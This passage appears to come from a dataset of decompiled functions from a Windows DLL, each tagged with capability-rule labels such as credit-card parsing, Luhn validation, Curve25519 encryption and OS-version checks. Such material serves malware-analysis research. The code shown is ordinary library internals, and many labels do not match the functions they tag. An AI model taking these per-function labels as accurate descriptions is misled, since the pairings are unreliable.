= *puVar5;\n        uVar3 = puVar5[1];\n        uStack32 = *param_1;\n        puVar5 = fcn.100046b0(auStack16, param_2);\n        fcn.100048a0(&stack0xffffffd8, *puVar5, puVar5[1], uVar2, uVar3);\n    }\n    return;\n}\n",
        "token_count": 441
    },
    "100046b0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.100046b0(int32_t *param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = param_1[1];\n    if ((param_3 < 0) && (uVar1 < -param_3)) {\n        *param_2 = *param_1 + (-(uVar1 + param_3) - 1 >> 5) * -4 + -4;\n        param_2[1] = uVar1 + param_3 & 0x1f;\n        return;\n    }\n    *param_2 = *param_1 + (uVar1 + param_3 >> 5) * 4;\n    param_2[1] = uVar1 + param_3 & 0x1f;\n    return;\n}\n",
        "token_count": 193
    },
    "10004790": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10004790(uint32_t *param_1, uint param_2, int32_t param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piStack24;\n    int32_t *piStack8;\n    uint32_t uStack4;\n    \n    uVar3 = fcn.10004c40(param_3, param_5, param_6);\n    uVar2 = *param_1;\n    uVar1 = uVar3 + param_3;\n    if ((uVar1 < 0) && (uVar1 != 0)) {\n        iVar4 = (-uVar1 - 1 >> 5) * -4 + -4;\n    }\n    else {\n        iVar4 = (uVar1 >> 5) * 4;\n    }\n    if ((uVar3 < 0) && (uVar3 != 0)) {\n        iVar5 = (-uVar3 - 1 >> 5) * -4 + -4;\n    }\n    else {\n        iVar5 = (uVar3 >> 5) * 4;\n    }\n    uStack4 = uVar2 & 0xffffff00;\n    uVar6 = uVar3 & 0x1f;\n    fcn.10007d40(uStack4, uVar2 + iVar5, uVar6, uVar2 + iVar4, uVar1 & 0x1f);\n    iVar4 = *piStack24;\n    if ((uVar3 < 0) && (uVar3 != 0)) {\n        piStack8[1] = uVar6;\n        *piStack8 = iVar4 + (-uVar3 - 1 >> 5) * -4 + -4;\n        return;\n    }\n    piStack8[1] = uVar6;\n    *piStack8 = iVar4 + (uVar3 >> 5) * 4;\n    return;\n}\n",
        "token_count": 476
    },
    "100048a0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __thiscall\nfcn.100048a0(uint32_t *param_1, uint param_2, int32_t param_3, int32_t param_4, int32_t param_5, int32_t param_6)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *unaff_retaddr;\n    uint32_t uStack24;\n    uint32_t uStack16;\n    int32_t iStack8;\n    \n    uVar4 = 0;\n    uStack16 = *param_1;\n    uVar1 = param_1[3];\n    uVar5 = uStack16;\n    if (uVar1 != 0) {\n        uVar4 = (param_3 - uStack16 >> 2) * 0x20 + param_4;\n        if ((uVar4 < 0) && (uVar4 != 0)) {\n            iVar2 = (-uVar4 - 1 >> 5) * -4 + -4;\n        }\n        else {\n            iVar2 = (uVar4 >> 5) * 4;\n        }\n        uVar5 = uStack16 + iVar2;\n        uVar4 = uVar4 & 0x1f;\n    }\n    uVar8 = 0;\n    uStack24 = uStack16;\n    if (uVar1 != 0) {\n        uVar8 = (param_5 - uStack16 >> 2) * 0x20 + param_6;\n        if ((uVar8 < 0) && (uVar8 != 0)) {\n            iVar2 = (-uVar8 - 1 >> 5) * -4 + -4;\n        }\n        else {\n            iVar2 = (uVar8 >> 5) * 4;\n        }\n        uStack24 = uStack16 + iVar2;\n        uVar8 = uVar8 & 0x1f;\n    }\n    uVar7 = (uVar5 - uStack16 >> 2) * 0x20 + uVar4;\n    if ((uVar5 != uStack24) || (uVar4 != uVar8)) {\n        uVar6 = 0;\n        uVar3 = uStack16;\n        if (uVar1 != 0) {\n            if ((uVar1 < 0) && (uVar1 != 0)) {\n                iVar2 = (-uVar1 - 1 >> 5) * -4 + -4;\n            }\n            else {\n                iVar2 = (uVar1 >> 5) * 4;\n            }\n            uVar3 = uStack16 + iVar2;\n            uVar6 = uVar1 & 0x1f;\n        }\n        uStack16 = uStack16 & 0xffffff00;\n        fcn.10008fd0(uStack16, uStack24, uVar8, uVar3, uVar6, uVar5, uVar4);\n        fcn.10004710((uVar5 - *param_1 >> 2) * 0x20 + iStack8);\n    }\n    uVar1 = *param_1;\n    if ((uVar7 < 0) && (uVar7 != 0)) {\n        iVar2 = (-uVar7 - 1 >> 5) * -4 + -4;\n    }\n    else {\n        iVar2 = (uVar7 >> 5) * 4;\n    }\n    unaff_retaddr[1] = uVar7 & 0x1f;\n    *unaff_retaddr = uVar1 + iVar2;\n    return;\n}\n",
        "token_count": 836
    },
    "10004a30": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.10004a30(int32_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    uVar1 = param_1[3];\n    iVar2 = *param_1;\n    *param_2 = iVar2;\n    param_2[1] = 0;\n    if (uVar1 != 0) {\n        if ((uVar1 < 0) && (uVar1 != 0)) {\n            *param_2 = iVar2 - ((~uVar1 >> 5) * 4 + 4);\n            param_2[1] = uVar1 & 0x1f;\n            return param_2;\n        }\n        param_2[1] = uVar1 & 0x1f;\n        *param_2 = iVar2 + (uVar1 >> 5) * 4;\n    }\n    return param_2;\n}\n",
        "token_count": 218
    },
    "10004c40": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.10004c40(int32_t *param_1, uint32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint unaff_EDI;\n    int32_t iVar7;\n    uchar auStack32 [4];\n    uchar auStack28 [4];\n    uchar auStack24 [4];\n    uint32_t uStack20;\n    \n    uVar4 = param_2;\n    iVar6 = (param_3 - *param_1 >> 2) * 0x20 + param_4;\n    if (param_2 != 0) {\n        if (-param_1[3] - 1U < param_2) {\n            fcn.1000a1f1(\"vector<bool> too long\");\n            pcVar3 = swi(3);\n            iVar6 = (*pcVar3)();\n            return iVar6;\n        }\n        param_2 = 0;\n        fcn.10004e70(uVar4 + 0x1f + param_1[3] >> 5, &param_2);\n        iVar7 = param_1[3];\n        if (iVar7 == 0) {\n            param_1[3] = uVar4;\n            return iVar6;\n        }\n        fcn.10004a30(auStack32);\n        param_1[3] = uVar4 + iVar7;\n        iVar7 = *param_1;\n        puVar5 = fcn.10004a30(auStack28);\n        uVar1 = *puVar5;\n        uVar2 = puVar5[1];\n        puVar5 = fcn.100046b0(auStack24, iVar6);\n        uStack20 = uStack20 & 0xffffff00;\n        fcn.100086f0(uStack20, *puVar5, puVar5[1], unaff_EDI, iVar7, uVar1, uVar2);\n    }\n    return iVar6;\n}\n",
        "token_count": 477
    },
    "100066b0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.100066b0(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    uVar5 = 0;\n    if (*(param_1 + 0x68) != 0) {\n        do {\n            iVar3 = (uVar5 >> 5) * 4;\n            in_EAX = *(param_1 + 0x24) + iVar3;\n            uVar4 = 1 << (uVar5 & 0x1f);\n            if (((*in_EAX & uVar4) != 0) && (in_EAX = *(param_1 + 4) + iVar3,  (*in_EAX & uVar4) != 0)) {\n                piVar1 = *(param_1 + 0x34) + uVar5 * 8;\n                piVar2 = *(param_1 + 0x14) + uVar5 * 8;\n                if (*piVar1 != *piVar2) {\n                    uVar4 = *(*(param_1 + 0x14) + uVar5 * 8) - *(param_1 + 0x4c);\n                    return uVar4 & 0xffffff00 |\n                           (*(*(param_1 + 0x34) + uVar5 * 8) - *(param_1 + 0x4c) & 0xfffffffeU) < (uVar4 & 0xfffffffe);\n                }\n                in_EAX = piVar1[1];\n                if (in_EAX != piVar2[1]) {\n                    uVar4 = *(*(param_1 + 0x14) + 4 + uVar5 * 8) - *(param_1 + 0x4c);\n                    return uVar4 & 0xffffff00 |\n                           (*(*(param_1 + 0x34) + 4 + uVar5 * 8) - *(param_1 + 0x4c) & 0xfffffffeU) <\n                           (uVar4 & 0xfffffffe);\n                }\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < *(param_1 + 0x68));\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 538
    },
    "10008110": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10008110(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    code **ppcVar2;\n    uint extraout_ECX;\n    code *pcVar3;\n    \n    pcVar3 = *(param_1 + 0xc) + 1;\n    *(param_1 + 0xc) = pcVar3;\n    ppcVar2 = fcn.1000ac95(0x18);\n    ppcVar2[4] = NULL;\n    ppcVar2[1] = 0xd;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    *ppcVar2 = vtable.std::_Node_capture.0;\n    ppcVar2[5] = pcVar3;\n    ppcVar2[4] = *(param_1 + 0x28);\n    pcVar3 = *(*(param_1 + 0x28) + 0xc);\n    if (pcVar3 != NULL) {\n        ppcVar2[3] = pcVar3;\n        *(*(*(param_1 + 0x28) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 0x28) + 0xc) = ppcVar2;\n    *(param_1 + 0x28) = ppcVar2;\n    fcn.10005650();\n    fcn.100057f0(ppcVar2);\n    fcn.100043b0(*(param_1 + 0xc) + 1, extraout_ECX);\n    puVar1 = *(param_1 + 0x14) + (ppcVar2[5] >> 5) * 4;\n    *puVar1 = *puVar1 | 1 << (ppcVar2[5] & 0x1f);\n    return;\n}\n",
        "token_count": 422
    },
    "100076c0": {
        "rules": [
            "parse credit card information/f44d27b3cce043409e5315cf54d1899b",
            "search for credit card data/ac143e9ae29c414184a69c9308e24693"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100076c0(int16_t **param_1)\n\n{\n    int16_t *piVar1;\n    \n    fcn.10008270();\n    if (param_1[0x13] == 0x5e) {\n        *(param_1[10] + 4) = *(param_1[10] + 4) ^ 1;\n        piVar1 = *param_1;\n        if (piVar1 != param_1[2]) {\n            if (((*piVar1 == 0x5c) && (piVar1 = piVar1 + 1,  piVar1 != param_1[2])) &&\n               ((((param_1[0x14] & 8) == 0 && ((*piVar1 == 0x28 || (*piVar1 == 0x29)))) ||\n                (((param_1[0x14] & 0x10) == 0 && ((*piVar1 == 0x7b || (*piVar1 == 0x7d)))))))) {\n                *param_1 = piVar1;\n            }\n            *param_1 = *param_1 + 1;\n        }\n        fcn.100054a0();\n    }\n    if (((param_1[0x14] & 0x20000000) != 0) && (param_1[0x13] == 0x5d)) {\n        fcn.10008d80(0x5d);\n        fcn.100067a0();\n    }\n    fcn.10007e60();\n    return;\n}\n",
        "token_count": 349
    },
    "10007820": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __fastcall fcn.10007820(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    \n    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n    if (((*(param_1 + 0x50) & 0x8000000) == 0) && (*(param_1 + 0x4c) == 0x29)) {\n        fcn.1000a231(5);\ncode_r0x100078b2:\n        fcn.1000a231(0xe);\n        pcVar2 = swi(3);\n        uVar3 = (*pcVar2)();\n        return uVar3;\n    }\n    if (((*(param_1 + 0x50) & 0x20) == 0) || (*(param_1 + 0x4c) != 0x3f)) {\n        if ((*(param_1 + 0x40) & 0x200) == 0) {\n            fcn.10008110();\n            *(param_1 + 0x10) = *(param_1 + 0x10) + -1;\n            return 1;\n        }\n    }\n    else {\n        fcn.100067a0();\n        iVar1 = *(param_1 + 0x4c);\n        fcn.100067a0();\n        if (iVar1 != 0x3a) {\n            if (iVar1 == 0x21) {\n                fcn.10008240(1);\n                *(param_1 + 0x10) = *(param_1 + 0x10) + -1;\n                return 0;\n            }\n            if (iVar1 == 0x3d) {\n                fcn.10008240(0);\n                *(param_1 + 0x10) = *(param_1 + 0x10) + -1;\n                return 0;\n            }\n            goto code_r0x100078b2;\n        }\n    }\n    fcn.100081c0();\n    *(param_1 + 0x10) = *(param_1 + 0x10) + -1;\n    return 1;\n}\n",
        "token_count": 495
    },
    "10007b10": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10007b10(int32_t param_1, uint param_2)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    \n    if ((*(*(param_1 + 4) + 4) != 6) || ((*(*(param_1 + 4) + 8) & 4) != 0)) {\n        fcn.10008640();\n    }\n    if ((*(param_1 + 8) & 0x100) == 0) {\n        if ((*(param_1 + 8) & 0x800) == 0) {\n            uVar5 = param_2;\n        }\n        else {\n            uVar5 = fcn.10004510(param_2);\n        }\n    }\n    else {\n        ppcVar1 = *(*(param_1 + 0xc) + 4);\n        pcVar2 = *ppcVar1;\n        if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n            uVar5 = fcn.1000a294(param_2, ppcVar1 + 2);\n        }\n        else {\n            uVar5 = (**(pcVar2 + 0x20))(param_2);\n        }\n    }\n    iVar3 = *(param_1 + 4);\n    uVar4 = *(iVar3 + 0x18);\n    if (*(iVar3 + 0x14) < uVar4 || *(iVar3 + 0x14) == uVar4) {\n        iVar6 = fcn.1000fe67(*(iVar3 + 0x1c), (uVar4 + 0x10) * 2);\n        if (iVar6 == 0) {\n            fcn.1000b73a();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        *(iVar3 + 0x1c) = iVar6;\n        *(iVar3 + 0x14) = uVar4 + 0x10;\n    }\n    *(*(iVar3 + 0x1c) + *(iVar3 + 0x18) * 2) = uVar5;\n    *(iVar3 + 0x18) = *(iVar3 + 0x18) + 1;\n    return;\n}\n",
        "token_count": 533
    },
    "1000ba2b": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x1000ba6c)\n// WARNING: Removing unreachable block (ram,0x1000bb1c)\n// WARNING: Removing unreachable block (ram,0x1000baa6)\n\nuint fcn.1000ba2b(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_XCR0;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x100413b4 = 0;\n    *0x10040080 = *0x10040080 | 1;\n    iVar4 = sub.KERNEL32.dll_IsProcessorFeaturePresent(10);\n    uVar3 = *0x10040080;\n    if (iVar4 != 0) {\n        var_10h = 0;\n        *0x10040080 = *0x10040080 | 2;\n        *0x100413b4 = 1;\n        piVar1 = cpuid_basic_info(0);\n        puVar2 = cpuid_Version_info(1);\n        uVar6 = puVar2[3];\n        if (((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) &&\n           (((((uVar5 = *puVar2 & 0xfff3ff0,  uVar5 == 0x106c0 || (uVar5 == 0x20660)) || (uVar5 == 0x20670)) ||\n             ((uVar5 == 0x30650 || (uVar5 == 0x30660)))) || (uVar5 == 0x30670)))) {\n            *0x100413b8 = *0x100413b8 | 1;\n        }\n        if (6 < *piVar1) {\n            iVar4 = cpuid_Extended_Feature_Enumeration_info(7);\n            var_10h = *(iVar4 + 4);\n            if ((var_10h & 0x200) != 0) {\n                *0x100413b8 = *0x100413b8 | 2;\n            }\n        }\n        if ((uVar6 & 0x100000) != 0) {\n            *0x10040080 = uVar3 | 6;\n            *0x100413b4 = 2;\n            if ((((uVar6 & 0x8000000) != 0) && ((uVar6 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {\n                *0x10040080 = uVar3 | 0xe;\n                *0x100413b4 = 3;\n                if ((var_10h & 0x20) != 0) {\n                    *0x10040080 = uVar3 | 0x2e;\n                    *0x100413b4 = 5;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 772
    },
    "100086f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t ** __thiscall\nfcn.100086f0(uint32_t **param_1, uint param_2, uint32_t *param_3, int32_t param_4, uint32_t *param_5, int32_t param_6, \n            uint32_t *param_7, uint32_t *param_8)\n\n{\n    while( true ) {\n        if ((param_3 == param_5) && (param_4 == param_6)) break;\n        if (param_6 == 0) {\n            param_5 = param_5 + -1;\n            param_6 = 0x1f;\n        }\n        else {\n            param_6 = param_6 + -1;\n        }\n        if (param_8 == NULL) {\n            param_7 = param_7 + -1;\n            param_8 = 0x1f;\n        }\n        else {\n            param_8 = param_8 + -1;\n        }\n        if ((*param_5 & 1 << (param_6 & 0x1f)) == 0) {\n            *param_7 = *param_7 & ~(1 << (param_8 & 0x1f));\n        }\n        else {\n            *param_7 = *param_7 | 1 << (param_8 & 0x1f);\n        }\n    }\n    *param_1 = param_7;\n    param_1[1] = param_8;\n    return param_1;\n}\n",
        "token_count": 325
    },
    "10008a70": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nushort __thiscall fcn.10008a70(int32_t param_1, int16_t param_2)\n\n{\n    if (param_2 == 0x66) {\n        *(param_1 + 0x44) = 0xc;\n        return 1;\n    }\n    if (param_2 == 0x6e) {\n        *(param_1 + 0x44) = 10;\n        return 1;\n    }\n    if (param_2 == 0x72) {\n        *(param_1 + 0x44) = 0xd;\n        return 1;\n    }\n    if (param_2 == 0x74) {\n        *(param_1 + 0x44) = 9;\n        return 1;\n    }\n    if (param_2 == 0x76) {\n        *(param_1 + 0x44) = 0xb;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 212
    },
    "10014f63": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10014f63(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x10041808));\n    return;\n}\n",
        "token_count": 69
    },
    "10015018": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10015018(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x10041808));\n    return;\n}\n",
        "token_count": 69
    },
    "1001e734": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.1001e734(uint8_t *arg_8h, uint32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    \n    if (arg_8h == NULL) {\n        arg_ch = 0;\n    }\n    else {\n        if (arg_ch != 0) {\n            if ((arg_ch & 0xffffff80) == 0) {\n                *arg_8h = arg_ch;\n                return 1;\n            }\n            if ((arg_ch & 0xfffff800) == 0) {\n                uVar3 = 0xc0;\n                iVar4 = 1;\n                iVar2 = iVar4;\n            }\n            else if ((arg_ch & 0xffff0000) == 0) {\n                if ((0xd7ff < arg_ch) && (arg_ch < 0xe000)) {\ncode_r0x1001e708:\n                    iVar2 = fcn.1001e715(arg_10h);\n                    return iVar2;\n                }\n                iVar4 = 2;\n                uVar3 = 0xe0;\n                iVar2 = iVar4;\n            }\n            else {\n                if (((arg_ch & 0xffe00000) != 0) || (0x10ffff < arg_ch)) goto code_r0x1001e708;\n                iVar4 = 3;\n                uVar3 = 0xf0;\n                iVar2 = iVar4;\n            }\n            do {\n                uVar1 = arg_ch;\n                arg_ch = arg_ch >> 6;\n                arg_8h[iVar4] = uVar1 & 0x3f | 0x80;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            *arg_8h = arg_ch | uVar3;\n            *arg_10h = 0;\n            arg_10h[1] = 0;\n            return iVar2 + 1;\n        }\n        *arg_8h = arg_ch;\n    }\n    *arg_10h = arg_ch;\n    arg_10h[1] = arg_ch;\n    return 1;\n}\n",
        "token_count": 493
    },
    "1001af0a": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.1001af0a(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    char **ppcVar10;\n    char **arg_8h_00;\n    char **var_28h;\n    char **var_24h;\n    uint var_20h;\n    char **var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char **var_8h;\n    char *var_4h;\n    \n    if (arg_ch == NULL) {\n        puVar3 = fcn.10010ea9();\n        iVar8 = 0x16;\n        *puVar3 = 0x16;\n        fcn.10010dcf();\n    }\n    else {\n        pcVar7 = NULL;\n        *arg_ch = 0;\n        iVar8 = *arg_8h;\n        var_28h = NULL;\n        var_24h = NULL;\n        var_20h = 0;\n        ppcVar10 = var_28h;\n        while (var_28h = ppcVar10,  iVar8 != 0) {\n            var_4h = CONCAT13(var_4h >> 0x18, 0x3f2a);\n            iVar8 = fcn.1001f070(iVar8, &var_4h);\n            if (iVar8 == 0) {\n                iVar8 = fcn.1001ab25(*arg_8h, 0, 0, &var_28h);\n            }\n            else {\n                iVar8 = fcn.1001abd6(*arg_8h, iVar8, &var_28h);\n            }\n            ppcVar10 = var_28h;\n            var_8h = iVar8;\n            if (iVar8 != 0) goto code_r0x1001aad6;\n            arg_8h = arg_8h + 1;\n            iVar8 = *arg_8h;\n        }\n        var_4h = NULL;\n        var_ch = (var_24h - ppcVar10 >> 2) + 1;\n        uVar9 = ~-(var_24h < ppcVar10) & (var_24h - ppcVar10) + 3U >> 2;\n        var_8h = ppcVar10;\n        if (uVar9 != 0) {\n            uVar6 = 0;\n            do {\n                pcVar5 = *var_8h;\n                var_10h = pcVar5 + 1;\n                do {\n                    cVar1 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                } while (cVar1 != '\\0');\n                pcVar7 = pcVar5 + pcVar7 + (1 - var_10h);\n                var_8h = var_8h + 1;\n                uVar6 = uVar6 + 1;\n                var_4h = pcVar7;\n            } while (uVar6 != uVar9);\n        }\n        iVar8 = fcn.100126e5(var_ch, var_4h, 1);\n        if (iVar8 == 0) {\n            iVar8 = -1;\n            var_8h = 0xffffffff;\n        }\n        else {\n            var_ch = iVar8 + var_ch * 4;\n            var_18h = var_ch;\n            if (ppcVar10 != var_24h) {\n                var_1ch = iVar8 - ppcVar10;\n                var_8h = ppcVar10;\n                do {\n                    var_14h = *var_8h;\n                    var_10h = var_14h;\n                    do {\n                        cVar1 = *var_10h;\n                        var_10h = var_10h + 1;\n                    } while (cVar1 != '\\0');\n                    var_10h = var_10h + (1 - (var_14h + 1));\n                    iVar4 = fcn.1001e548(var_ch, var_4h + (var_18h - var_ch), var_14h, var_10h);\n                    if (iVar4 != 0) {\n                        fcn.10010dfc(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar8 = (*pcVar2)();\n                        return iVar8;\n                    }\n                    *(var_1ch + var_8h) = var_ch;\n                    var_8h = var_8h + 1;\n                    var_ch = var_ch + var_10h;\n                } while (var_8h != var_24h);\n            }\n            var_8h = NULL;\n            *arg_ch = iVar8;\n            iVar8 = 0;\n        }\n        fcn.10011806(0);\ncode_r0x1001aad6:\n        uVar6 = 0;\n        uVar9 = ~-(var_24h < ppcVar10) & var_24h + (3 - ppcVar10) >> 2;\n        arg_8h_00 = ppcVar10;\n        var_1ch = ppcVar10;\n        var_18h = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.10011806(*ppcVar10);\n                uVar6 = uVar6 + 1;\n                ppcVar10 = ppcVar10 + 1;\n                iVar8 = var_8h;\n                arg_8h_00 = var_28h;\n            } while (uVar6 != uVar9);\n        }\n        fcn.10011806(arg_8h_00);\n    }\n    return iVar8;\n}\n",
        "token_count": 1343
    },
    "10001090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.10001090(code **param_1, uint param_2)\n\n{\n    uint uStack8;\n    uchar uStack4;\n    \n    uStack8 = param_2;\n    uStack4 = 1;\n    *param_1 = vtable.std::exception.0;\n    *(param_1 + 1) = 0;\n    fcn.1000bc0d(&uStack8, param_1 + 1);\n    return param_1;\n}\n",
        "token_count": 109
    },
    "100010d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.100010d0(code **param_1, int32_t param_2)\n\n{\n    *param_1 = vtable.std::exception.0;\n    *(param_1 + 1) = 0;\n    fcn.1000bc0d(param_2 + 4, param_1 + 1);\n    return param_1;\n}\n",
        "token_count": 84
    },
    "10001160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.10001160(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    code *var_24h;\n    uint var_20h;\n    char *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002a70a;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.10009b56(0);\n    *(in_ECX + 4) = 0;\n    *(in_ECX + 8) = 0;\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 0x10) = 0;\n    *(in_ECX + 0x14) = 0;\n    *(in_ECX + 0x18) = 0;\n    *(in_ECX + 0x1c) = 0;\n    *(in_ECX + 0x20) = 0;\n    *(in_ECX + 0x24) = 0;\n    *(in_ECX + 0x28) = 0;\n    *(in_ECX + 0x2c) = 0;\n    *(in_ECX + 0x30) = 0;\n    var_4h = 6;\n    if (arg_8h == 0) {\n        var_24h = vtable.std::exception.0;\n        var_18h = \"bad locale name\";\n        var_14h._0_1_ = 1;\n        _var_20h = 0;\n        fcn.1000bc0d(&var_18h, &var_20h);\n        var_24h = vtable.std::runtime_error.0;\n        arg_8h = fcn.1000da34(&var_24h, 0x1003ef1c);\n    }\n    fcn.10009e9e(in_ECX, arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 502
    },
    "10001540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.10001540(code **param_1, uint param_2, code *param_3)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code **ppcVar4;\n    uchar auStack68 [16];\n    uchar auStack52 [52];\n    \n    param_1[1] = param_3;\n    *param_1 = vtable.std::ctype_wchar_t_.0;\n    ppcVar4 = fcn.1000a2f6(auStack68);\n    pcVar1 = ppcVar4[1];\n    pcVar2 = ppcVar4[2];\n    pcVar3 = ppcVar4[3];\n    param_1[2] = *ppcVar4;\n    param_1[3] = pcVar1;\n    param_1[4] = pcVar2;\n    param_1[5] = pcVar3;\n    ppcVar4 = fcn.1000a448(auStack52);\n    pcVar1 = ppcVar4[1];\n    pcVar2 = ppcVar4[2];\n    pcVar3 = ppcVar4[3];\n    param_1[6] = *ppcVar4;\n    param_1[7] = pcVar1;\n    param_1[8] = pcVar2;\n    param_1[9] = pcVar3;\n    pcVar1 = ppcVar4[5];\n    pcVar2 = ppcVar4[6];\n    pcVar3 = ppcVar4[7];\n    param_1[10] = ppcVar4[4];\n    param_1[0xb] = pcVar1;\n    param_1[0xc] = pcVar2;\n    param_1[0xd] = pcVar3;\n    *(param_1 + 0xe) = *(ppcVar4 + 8);\n    param_1[0x10] = ppcVar4[10];\n    return param_1;\n}\n",
        "token_count": 449
    },
    "10001c70": {
        "rules": [
